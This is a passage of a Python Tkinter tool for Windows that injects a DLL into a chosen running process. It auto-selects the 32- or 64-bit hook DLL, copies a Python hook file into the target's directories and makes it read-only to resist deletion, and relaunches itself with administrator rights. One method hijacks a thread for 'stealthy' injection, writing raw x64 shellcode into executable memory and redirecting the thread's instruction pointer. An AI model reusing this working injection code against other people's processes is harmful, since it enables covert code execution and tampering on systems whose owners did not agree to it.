        self.log(f"Found {len(self.all_processes)} processes")
    
    def display_processes(self, processes):
        self.tree.delete(*self.tree.get_children())
        for pid, name, arch, exe in sorted(processes, key=lambda x: x[1].lower()):
            self.tree.insert("", tk.END, values=(pid, name, arch, exe))
    
    def filter_processes(self):
        search_term = self.search_var.get().lower()
        if not search_term:
            self.display_processes(self.all_processes)
            return
        
        filtered = [p for p in self.all_processes 
                    if search_term in p[1].lower() or search_term in str(p[0])]
        self.display_processes(filtered)

    def browse_hook_file(self):
        filename = filedialog.askopenfilename(filetypes=[("Python files", "*.py"), ("All files", "*.*")])
        if filename: self.hook_file_var.set(filename)

    def browse_dll(self):
        filename = filedialog.askopenfilename(filetypes=[("DLL files", "*.dll"), ("All files", "*.*")])
        if filename: self.dll_path_var.set(filename)

    def quick_inject(self):
        self.inject_dll()

    def inject_dll(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a process to inject into")
            return
        
        item = self.tree.item(selected[0])
        pid = int(item['values'][0])
        name = item['values'][1]
        dll_path = self.dll_path_var.get()

        # FIX: Auto-switch DLL based on target architecture
        try:
            is_target_64 = self._is_64bit_process(pid)
            
            # Only switch if we successfully determined the architecture
            if is_target_64 is not None:
                target_arch_str = "64-bit" if is_target_64 else "32-bit"
                
                dir_name = os.path.dirname(dll_path)
                base_name = os.path.basename(dll_path).lower()
                
                new_dll = None
                if is_target_64 and "hook32.dll" in base_name:
                    new_dll = os.path.join(dir_name, "hook64.dll")
                elif not is_target_64 and "hook64.dll" in base_name:
                    new_dll = os.path.join(dir_name, "hook32.dll")
                    
                if new_dll and os.path.exists(new_dll):
                    self.log(f"Auto-switching DLL to {os.path.basename(new_dll)} for {target_arch_str} target.", "warning")
                    dll_path = new_dll
        except Exception as e:
            self.log(f"Error checking architecture: {e}", "error")
        
        if not os.path.exists(dll_path):
            messagebox.showerror("DLL Not Found", f"DLL file not found:\n{dll_path}")
            return
        
        self.inject_btn.config(state=tk.DISABLED, text="Injecting...")
        threading.Thread(target=self._inject_thread, args=(pid, name, dll_path), daemon=True).start()

    def _inject_thread(self, pid, name, dll_path):
        try:
            self.log(f"Starting injection into {name} (PID: {pid})")
            
            # Copy hook logic
            if not self.use_global_hook_path.get():
                self._copy_hook_to_target(pid, self.log)
            else:
                self.log("Global Path Mode: Skipping local __hook__.py copy.", "info")
            
            # Use the same synchronous logic but in this thread
            success, _ = self._inject_sync(pid, dll_path, copy_hook=False)
            
            if success:
                 self.log(f"✓✓✓ DLL INJECTED AND LOADED SUCCESSFULLY! ✓✓✓", "success")
                 messagebox.showinfo("Success", f"DLL injected into {name}!")
            else:
                 self.log(f"Injection Failed or DLL load returned 0.", "error")
                 messagebox.showerror("Error", "Injection failed. Check logs.")

        except Exception as e:
            self.log(f"Exception during injection: {e}", "error")
        finally:
            self.inject_btn.config(state=tk.NORMAL, text="💉 INJECT DLL")

    def _copy_hook_to_target(self, pid, log_func, known_dir=None, known_cwd=None):
        proc_dir = known_dir
        cwd = known_cwd

        if not proc_dir:
            try:
                proc = psutil.Process(pid)
                exe_path = proc.exe()
                proc_dir = os.path.dirname(exe_path)
                cwd = proc.cwd()
            except Exception as e:
                log_func(f"Failed to get paths for PID {pid}: {e}", "warning")
                # Fallback: cannot copy if we don't know where
                return False

        hook_file = self.hook_file_var.get()
        
        # Smart lookup: if not found (relative/absolute), check script directory
        if not os.path.exists(hook_file):
            script_dir = os.path.dirname(os.path.abspath(__file__))
            candidate = os.path.join(script_dir, hook_file)
            if os.path.exists(candidate):
                hook_file = candidate
            # If default name, check script dir specifically
            elif hook_file == "__hook__.py":
                 candidate = os.path.join(script_dir, "__hook__.py")
                 if os.path.exists(candidate):
                     hook_file = candidate

        if not os.path.exists(hook_file): 
            log_func(f"Hook file not found: {hook_file}", "error")
            return False

        try:
            import stat
            if proc_dir:
                dest = os.path.join(proc_dir, "__hook__.py")
                shutil.copy2(hook_file, dest)
                os.chmod(dest, stat.S_IREAD) # Make read-only to prevent deletion
                log_func(f"Copied hook to: {dest} (Read-Only)", "success")
            
            if cwd and cwd != proc_dir:
                dest_cwd = os.path.join(cwd, "__hook__.py")
                shutil.copy2(hook_file, dest_cwd)
                os.chmod(dest_cwd, stat.S_IREAD) # Make read-only
                log_func(f"Copied hook to CWD: {dest_cwd} (Read-Only)", "success")
                
            return True
        except Exception as e:
            log_func(f"Copy hook exception: {e}", "error")
            return False

    def _hijack_thread(self, pid, dll_path, is_64):
        """
        Stealthy injection via Thread Hijacking (x64 only for now).
        """
        if not is_64:
            self.log("Thread Hijacking: x86 not yet implemented in this method.", "error")
            return False

        h_process = None
        h_thread = None
        try:
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process: return False

            # 1. Find a thread
            target_thread = None
            for t in psutil.Process(pid).threads():
                target_thread = t.id
                break
            
            if not target_thread:
                self.log("Thread Hijacking: No suitable thread found.", "error")
                return False

            h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, target_thread)
            if not h_thread:
                self.log(f"Thread Hijacking: OpenThread failed. Error: {ctypes.get_last_error()}", "error")
                return False

            # 2. Suspend thread
            if kernel32.SuspendThread(h_thread) == 0xFFFFFFFF:
                self.log("Thread Hijacking: Failed to suspend thread.", "error")
                return False

            # 3. Get Context
            ctx = CONTEXT64()
            ctx.ContextFlags = CONTEXT_FULL
            if not kernel32.GetThreadContext(h_thread, ctypes.byref(ctx)):
                self.log(f"Thread Hijacking: GetThreadContext failed. Error: {ctypes.get_last_error()}", "error")
                kernel32.ResumeThread(h_thread)
                return False

            # 4. Allocate memory for DLL path and shellcode
            dll_path_w = dll_path + "\x00"
            dll_path_bytes = dll_path_w.encode('utf-16le')
            
            # Simple x64 shellcode:
            # push rax; push rcx; push rdx; push r8; push r9; push r10; push r11
            # sub rsp, 28h
            # mov rcx, <dll_path_addr>
            # mov rax, <load_library_addr>
            # call rax
            # add rsp, 28h
            # pop r11; pop r10; pop r9; pop r8; pop rdx; pop rcx; pop rax
            # jmp <original_rip>
            
            h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
            load_library_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryW")
            
            # Allocation
            alloc_addr = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes) + 128, MEM_COMMIT | MEM_RESERVE, 0x40) # PAGE_EXECUTE_READWRITE
            if not alloc_addr:
                kernel32.ResumeThread(h_thread)
                return False
                
            path_addr = alloc_addr
            shellcode_addr = alloc_addr + len(dll_path_bytes)
            
            # Write DLL Path
            kernel32.WriteProcessMemory(h_process, path_addr, dll_path_bytes, len(dll_path_bytes), None)
            
            # Build Shellcode
            import struct
            sc = b"\x50\x51\x52\x41\x50\x41\x51\x41\x52\x41\x53" # push rax, rcx, rdx, r8, r9, r10, r11
            sc += b"\x48\x83\xEC\x28" # sub rsp, 28h
            sc += b"\x48\xB9" + struct.pack("<Q", path_addr) # mov rcx, path_addr
            sc += b"\x48\xB8" + struct.pack("<Q", load_library_addr) # mov rax, load_library_addr
            sc += b"\xFF\xD0" # call rax
            sc += b"\x48\x83\xC4\x28" # add rsp, 28h
            sc += b"\x41\x5B\x41\x5A\x41\x59\x41\x58\x5A\x59\x58" # pop r11, r10, r9, r8, rdx, rcx, rax
            sc += b"\x48\xB8" + struct.pack("<Q", ctx.Rip) # mov rax, original_rip
            sc += b"\xFF\xE0" # jmp rax
            
            kernel32.WriteProcessMemory(h_process, shellcode_addr, sc, len(sc), None)
            
            # 5. Hijack
            ctx.Rip = shellcode_addr
            if not kernel32.SetThreadContext(h_thread, ctypes.byref(ctx)):
                self.log(f"Thread Hijacking: SetThreadContext failed. Error: {ctypes.get_last_error()}", "error")
                kernel32.ResumeThread(h_thread)
                return False
                
            # 6. Resume
            kernel32.ResumeThread(h_thread)
            self.log(f"Thread Hijacking: Thread {target_thread} hijacked successfully!", "success")
            return True

        except Exception as e:
            self.log(f"Thread Hijacking Exception: {e}", "error")
            return False
        finally:
            if h_thread: kernel32.CloseHandle(h_thread)
            if h_process: kernel32.CloseHandle(h_process)

    def _is_64bit_process(self, pid):
        """
        Determines if a process is 64-bit.
        Returns True if 64-bit, False if 32-bit, None if unknown/failed.
        """
        # FIRST: Check the EXE header on disk (Most reliable if OS is lying)
        try:
            exe_path = psutil.Process(pid).exe()
            if os.path.exists(exe_path):
                with open(exe_path, "rb") as f:
                    data = f.read(1024)
                    if data.startswith(b'MZ'):
                        # PE header offset is at 0x3C
                        pe_offset = int.from_bytes(data[0x3C:0x40], "little")
                        if len(data) > pe_offset + 6:
                            # Signature 'PE\0\0' followed by Machine Type (2 bytes)
                            machine = int.from_bytes(data[pe_offset+4:pe_offset+6], "little")
                            if machine == 0x8664: # IMAGE_FILE_MACHINE_AMD64
                                return True
                            if machine == 0x014c: # IMAGE_FILE_MACHINE_I386
                                return False
        except Exception as e:
            self.log(f"Arch check (PE): Failed reading {pid}'s EXE. {e}", "warning")

        try:
            # SECOND: Try Limited Query (API check)
            h_process = kernel32.OpenProcess(0x1000, False, pid) # PROCESS_QUERY_LIMITED_INFORMATION
            if not h_process:
                # Fallback to standard Query
                h_process = kernel32.OpenProcess(0x0400, False, pid) # PROCESS_QUERY_INFORMATION
                
            if not h_process:
                self.log(f"Arch check: Failed to OpenProcess {pid}. Error: {ctypes.get_last_error()}", "warning")
                return None
                
            is_wow64 = ctypes.c_int(0)
            if not kernel32.IsWow64Process(h_process, ctypes.byref(is_wow64)):
                self.log(f"Arch check: IsWow64Process failed for {pid}. Error: {ctypes.get_last_error()}", "warning")
                kernel32.CloseHandle(h_process)
                return None
                
            kernel32.CloseHandle(h_process)
            
            # If IsWow64Process is TRUE, it's a 32-bit process on 64-bit Windows.
            import platform
            is_os_64 = platform.machine().endswith("64")
            
            if is_os_64:
                 return not is_wow64.value
            else:
                 return False # 32-bit OS -> 32-bit process
                 
        except Exception as e:
            self.log(f"Arch check failed for PID {pid}: {e}", "warning")
            return None

    def open_hook_editor(self):
        if self.hook_editor_window and self.hook_editor_window.winfo_exists():
            self.hook_editor_window.lift()
            return
        
        self.hook_editor_window = Toplevel(self.root)
        self.hook_editor_window.title(f"Hook Editor - {self.hook_file_var.get()}")
        self.hook_editor_window.geometry("600x500")
        
        btn_frame = tk.Frame(self.hook_editor_window)
        btn_frame.pack(fill=tk.X)
        tk.Button(btn_frame, text="Save", command=self.save_hook_file_from_editor, bg="green", fg="white").pack(side=tk.LEFT)
        
        self.hook_editor_text = scrolledtext.ScrolledText(self.hook_editor_window, font=("Consolas", 10))
        self.hook_editor_text.pack(fill=tk.BOTH, expand=True)
        
        try:
            with open(self.hook_file_var.get(), "r") as f:
                self.hook_editor_text.insert('1.0', f.read())
        except:
            pass

    def save_hook_file_from_editor(self):
        try:
            with open(self.hook_file_var.get(), "w") as f:
                f.write(self.hook_editor_text.get('1.0', tk.END))
            messagebox.showinfo("Saved", "File saved.")
        except Exception as e:
            messagebox.showerror("Error", str(e))

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        # Re-run as admin
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    root = tk.Tk()
    app = DLLInjectorGUI(root)
    root.mainloop()
